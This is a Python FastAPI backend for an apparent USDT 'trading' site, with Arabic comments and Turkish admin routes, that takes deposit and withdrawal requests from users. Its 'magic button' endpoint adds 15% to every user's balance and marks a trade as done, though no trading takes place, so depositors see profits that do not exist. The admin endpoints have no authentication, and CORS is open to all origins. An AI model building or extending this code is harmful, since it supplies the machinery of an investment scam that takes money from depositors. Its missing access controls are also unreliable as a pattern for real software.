from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
import sqlite3

app = FastAPI(title="TRC20-USDT Trading Control System")

# 🔓 تفعيل استقبال الطلبات الخارجية من موقعك على github.io بدون حظر
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---- إعداد قاعدة البيانات وتوليد الجداول النظامية ----
def init_db():
    conn = sqlite3.connect("trading_app.db")
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        user_wallet TEXT,
        balance REAL DEFAULT 0.0,
        referred_by TEXT,
        is_active INTEGER DEFAULT 0
    )""")
    # جدول معلقات الإيداع والسحب لربط واجهة المستخدم مع لوحة المشرف
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS system_status (
        username TEXT PRIMARY KEY,
        balance REAL DEFAULT 0.0,
        trade_executed INTEGER DEFAULT 0,
        deposit_status TEXT DEFAULT 'none',
        pending_deposit REAL DEFAULT 0.0,
        withdraw_status TEXT DEFAULT 'none',
        pending_withdraw REAL DEFAULT 0.0,
        withdraw_wallet TEXT
    )""")
    conn.commit()
    conn.close()

init_db()

class DepositRequestData(BaseModel):
    username: str
    amount: float

class WithdrawRequestData(BaseModel):
    username: str
    wallet: str
    amount: float

# ---- 1. استقبال وفحص حالة المستخدم التلقائية ----
@app.get("/user/status")
def get_user_status(username: str):
    conn = sqlite3.connect("trading_app.db")
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM system_status WHERE username = ?", (username,))
    row = cursor.fetchone()
    if not row:
        cursor.execute("INSERT OR IGNORE INTO system_status (username) VALUES (?)", (username,))
        conn.commit()
        cursor.execute("SELECT * FROM system_status WHERE username = ?", (username,))
        row = cursor.fetchone()
    res = dict(row)
    res["trade_executed"] = True if res["trade_executed"] == 1 else False
    conn.close()
    return res

# ---- 2. استقبال طلبات الإيداع من واجهة المستخدم ----
@app.post("/deposit/request")
def deposit_request(req: DepositRequestData):
    conn = sqlite3.connect("trading_app.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO system_status (username) VALUES (?)", (req.username,))
    cursor.execute(
        "UPDATE system_status SET deposit_status = 'pending', pending_deposit = ? WHERE username = ?",
        (req.amount, req.username)
    )
    conn.commit()
    conn.close()
    return {"status": "success"}

# ---- 3. استقبال طلبات السحب من واجهة المستخدم ----
@app.post("/withdraw/request")
def withdraw_request(req: WithdrawRequestData):
    conn = sqlite3.connect("trading_app.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO system_status (username) VALUES (?)", (req.username,))
    cursor.execute(
        "UPDATE system_status SET withdraw_status = 'pending', pending_withdraw = ?, withdraw_wallet = ? WHERE username = ?",
        (req.amount, req.wallet, req.username)
    )
    conn.commit()
    conn.close()
    return {"status": "success"}

# ---- 4. جلب الطلبات المعلقة للوحة تحكم المشرف (admin.html) ----
@app.post("/api/yonetici/talepler")
def get_admin_demands():
    conn = sqlite3.connect("trading_app.db")
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT username as kullanici, pending_deposit as miktar FROM system_status WHERE deposit_status='pending'")
    yatirmalar = [dict(row) for row in cursor.fetchall()]
    cursor.execute("SELECT username as kullanici, pending_withdraw as miktar, withdraw_wallet as cuzdan FROM system_status WHERE withdraw_status='pending'")
    cekmeler = [dict(row) for row in cursor.fetchall()]
    conn.close()
    return {"yatirmalar": yatirmalar, "cekmeler": cekmeler}

# ---- 5. موافقة المشرف على الإيداع وتحديث رصيد المشترك فورا ----
@app.post("/api/yonetici/yatirma_onayla")
def approve_manual_deposit(username: str):
    conn = sqlite3.connect("trading_app.db")
    cursor = conn.cursor()
    cursor.execute("SELECT pending_deposit FROM system_status WHERE username = ?", (username,))
    res = cursor.fetchone()
    if res and res[0] > 0:
        amount = res[0]
        cursor.execute("UPDATE system_status SET balance = balance + ?, deposit_status = 'approved', pending_deposit = 0 WHERE username = ?", (amount, username))
        conn.commit()
    conn.close()
    return {"message": "Success"}

# ---- 6. زر الصفقة السحري بنسبة 15% وتوزيع الأرباح حياً ----
@app.post("/api/yonetici/sihirli_buton")
@app.post("/admin/run-trade-button")
def run_trade_button():
    conn = sqlite3.connect("trading_app.db")
    cursor = conn.cursor()
    cursor.execute("SELECT username, balance FROM system_status WHERE balance > 0")
    users = cursor.fetchall()
    for username, balance in users:
        profit = balance * 0.15
        new_balance = balance + profit
        cursor.execute("UPDATE system_status SET balance = ?, trade_executed = 1 WHERE username = ?", (new_balance, username))
    conn.commit()
    conn.close()
    return {"message": "Success"}
    
